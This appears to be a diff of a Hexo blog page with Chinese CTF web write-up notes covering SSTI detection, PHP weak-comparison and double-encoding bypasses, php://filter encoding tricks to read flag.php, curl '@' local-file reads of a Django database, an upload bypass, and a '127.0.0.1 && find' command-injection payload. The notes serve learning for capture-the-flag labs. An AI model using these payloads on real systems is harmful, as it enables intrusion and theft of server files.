class="string">&#x27;Enter password&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码实际上就是将pass的用逗号分隔的数字当作ascii转换为字母，无论dechiffre函数传参什么，结果都是 <code>FAUX PASSWORD HAHA</code><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927123112312.png" alt="image-20230927123112312"></p>
+<p>可以直接猜测dechiffre函数传参的那一串转换为文本</p>
+<p>16进制转字符串：<a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p>
+<p><code>55,56,54,79,115,69,114,116,107,49,50</code></p>
+<p>ascii转文本：<a target="_blank" rel="noopener" href="https://www.67tool.com/number/ascii-to-text">https://www.67tool.com/number/ascii-to-text</a></p>
+<p><code>786OsErtk12</code></p>
+<h3 id="初探SSTI"><a href="#初探SSTI" class="headerlink" title="初探SSTI"></a>初探SSTI</h3><p><code>MVC</code>是一种框架型模式，全名是Model View Controller,即模型－视图－控制器,这是一种业务逻辑、数据、界面显示分离的组织代码方式，便于web网站的维护和开发</p>
+<p><code>模型</code>：处理数据验证，<code>控制器</code>：在模型和视图之间传递数据，<code>视图</code>：显示信息给用户</p>
+<p>过程：用户的输入请求通过 View 接收，交给 Controller ，然后由 Controller 调用 Model ，验证信息后返回正确或错误给 Controller， Controller要求处理相应（正确则显示相应信息，错误404）的视图返回给浏览器。</p>
+<p>模板（ssti漏洞产生原因）：是View 中会大量地用到的一种技术，用于定义数据如何渲染成最终的用户界面，而用户的输入由view接收，用户的恶意输入未经任何处理就将其作为 Web 应用模板内容的一部分，而模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就会导致敏感信息泄露、代码执行、GetShell 等问题，这样的服务器端模板引擎漏洞就是ssti漏洞。</p>
+<h3 id="常见的模板引擎"><a href="#常见的模板引擎" class="headerlink" title="常见的模板引擎"></a>常见的模板引擎</h3><p>Python：jinja2、 mako、 tornado（框架）、 django</p>
+<p>php：smarty、 twig</p>
+<p>java：jade、 velocity</p>
+<p>模板引擎生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，放到渲染函数里，生成模板+用户数据的前端html页面，最后反馈给浏览器。大部分模板引擎有提供沙箱隔离机制 , 但存在沙箱逃逸技术来绕过，这个后面再了解</p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927230411892.png" alt="image-20230927230411892"></p>
+<p>框架：在Web开发中，框架和模板通常一起使用。框架提供了应用程序的整体结构和逻辑，包括路由、控制器和数据模型等。模板则负责将数据渲染成HTML或其他格式的用户界面，以便呈现给终端用户。框架通常提供一种将数据传递给模板的机制。</p>
+<h4 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig(PHP)"></a>Twig(PHP)</h4><p>Twig是一个用于PHP的流行的模板引擎</p>
+<h4 id="Flask框架"><a href="#Flask框架" class="headerlink" title="Flask框架"></a>Flask框架</h4><p>渲染方法有两种 : <code>render_template()</code> 和 <code>render_template_string()</code></p>
+<p><code>ender_template()</code> 函数，渲染一个指定的文件 , 这个指定的文件其实就是模板</p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231612877.png" alt="image-20230927231612877"></p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231620453.png" alt="image-20230927231620453"></p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231649505.png" alt="image-20230927231649505"></p>
+<p><code>render_template_string()</code> 函数渲染一个字符串</p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231655444.png" alt="image-20230927231655444"></p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231701528.png" alt="image-20230927231701528"></p>
+<p><code>render_template_string()</code>函数-&gt;ssti</p>
+<h4 id="ssti简单例子"><a href="#ssti简单例子" class="headerlink" title="ssti简单例子"></a>ssti简单例子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    html = <span class="string">&#x27;&#123;&#123;12*12&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html)</span><br></pre></td></tr></table></figure>
+
+<p>在flask框架中，模板引擎Jinja2会将<code>&#123;&#123; --- &#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行（flask+Jinja2是比较常用的组合）</p>
+<h4 id="引擎判断"><a href="#引擎判断" class="headerlink" title="引擎判断"></a>引擎判断</h4><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927232317680.png" alt="image-20230927232317680"></p>
+<p>绿色为执行成功，红色为执行失败，<code>&#123;&#123;7*'7'&#125;&#125;</code>在Twig中返回<code>49</code>，在Jinja2中返回<code>77777777</code></p>
+<h4 id="框架和模板概念区分"><a href="#框架和模板概念区分" class="headerlink" title="框架和模板概念区分"></a>框架和模板概念区分</h4><p>许多框架采用了MVC设计模式作为其架构的一部分，mvc是一种设计模型，而框架是以mvc为设计架构一部分的实体，Flask框架本身不是一个严格的MVC（Model-View-Controller）框架，但它提供了足够的灵活性，可以根据开发人员的需要实现MVC结构或其他类似的设计模式。</p>
+<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>抓包加入字典判断猜测</p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929163500908.png" alt="image-20230929163500908"></p>
+<p>传%80，根据报错信息，网页中出现大量Django，说明是Django框架，匹配报错信息中database关键字</p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929171119595.png" alt="image-20230929171119595"></p>
+<p>根据database的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>
+
+<p>页面搜索ctf，找到flag</p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929171327069.png"></p>
+<p><code>?url=@/opt/api/api/settings.py</code>也可以访问配置文件settings.py，但是其实在上面的报错信息中就可以找到database的路径。另外，上面的报错信息是html代码，所以可以复制代码，打开为网页查看</p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929174327555.png" alt="image-20230929174327555"></p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929174353265.png" alt="image-20230929174353265"></p>
+<p>这里就可以直观的看到setting中的database信息</p>
+<p>附录：</p>
+<p><code>url编码</code>：当 URL 路径或者查询参数中，带有中文或者特殊字符的时候，需要对 URL 进行编码。URL 之所以需要编码，是因为 URL 中的某些字符会引起歧义，比如 URL 查询参数中包含了”&amp;”或者”%”就会造成服务器解析错误。需要注意的是url编码采用的是十六进制，参照ascii码，比如？编码后是<code>%3F-&gt;63-&gt;?</code></p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929170444274.png" alt="image-20230929170444274"></p>
+<p>从1-127，因为%80的16进制解码后是128，超出了ascii的表示范围，所以会报错，%df,%a0同理</p>
+<p><code>curl参数上传</code>:在PHP中使用CURL进行文件上传时，@符号加上文件路径,CURL将自动读取该文件内容并将其作为请求参数,即使输入的文件路径有错或不存在，CURL仍然可以正常上传。</p>
+<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>查看index.phps,相当于是index.php的备份吧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;			</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
+
+<p>在url链接里直接运行，浏览器会进行一次url解码，所以要传入二次编码，就把a编码，由于a是在ascii表中，所以编码后依然是a，但我们知道a的ascii是97，所以%61解码后是a，直接再次编码，%2561</p>
+<p>payload:<code>?id=%2561dmin</code></p>
+<h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+<p>admin是字符串，开头不是数字，所以和0弱相等，经过测试admin在if条件判断中为真，所以if($a&#x3D;&#x3D;0 and $a)为真，b&#x3D;1235c，不是纯数字，开头数字大于1234即可</p>
+<h2 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h2><p><img src="/img/image-20231010145235176.png" alt="image-20231010145235176"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a[]=&#x27;flag.php&#x27;;   </span><br><span class="line"></span><br><span class="line">$a=array(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">$a=[&#x27;flag.php&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p>这里嵌套，使用第三种形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2033a&quot;,&quot;n&quot;:array(array(1,0),0)&#125; </span><br></pre></td></tr></table></figure>
+
+<p>如果是<code>c=&#123;&quot;m&quot;:&quot;2033%00&quot;,&quot;n&quot;:[[0,2],0]&#125;</code>,就需要url编码，最好都编码一下</p>
+<h2 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h2><p><img src="/img/image-20231010150216244.png" alt="image-20231010150216244"></p>
+<p>include一个check.php，说明一定有过滤，常规<code>php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="/img/image-20231010150320739.png" alt="image-20231010150320739"></p>
+<p>尝试给filename传read、base64，encode被过滤，知道了过滤点，flag没有过滤<br>绕过：convert.过滤器支持convert.iconv.格式<br>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line">或</span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/convert.iconv.UTF-<span class="number">8</span>*.UCS-4LE*/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>php支持的编码格式(部分)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac（别名：MacJapanese）</span><br><span class="line">SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）</span><br><span class="line">SJIS-Mobile#KDDI（别名：SJIS-KDDI）</span><br><span class="line">SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）</span><br><span class="line">UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）</span><br><span class="line">UTF-8-Mobile#KDDI-A</span><br><span class="line">UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）</span><br><span class="line">UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）</span><br><span class="line">ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）</span><br></pre></td></tr></table></figure>
+
+<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="/img/image-20231010153053389.png" alt="image-20231010153053389"></p>
+<p>想上传.php后缀发现弹窗</p>
+<p><img src="/img/image-20231010153126518.png" alt="image-20231010153126518"></p>
+<p>上传键被禁</p>
+<p><img src="/img/image-20231010153212033.png" alt="image-20231010153212033"></p>
+<p>删了这个disable，直接上传即可</p>
+<p><code>127.0.0.1 &amp;&amp; find / -name &quot;flag*&quot; </code>找不到flag的时候可以直接搜</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
-  {% include '_partials/pagination.swig' %}
-{% endblock %}
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+  </nav>
 
-{% block sidebar %}
-  {{ sidebar_template.render(false) }}
-{% endblock %}
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzklov</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
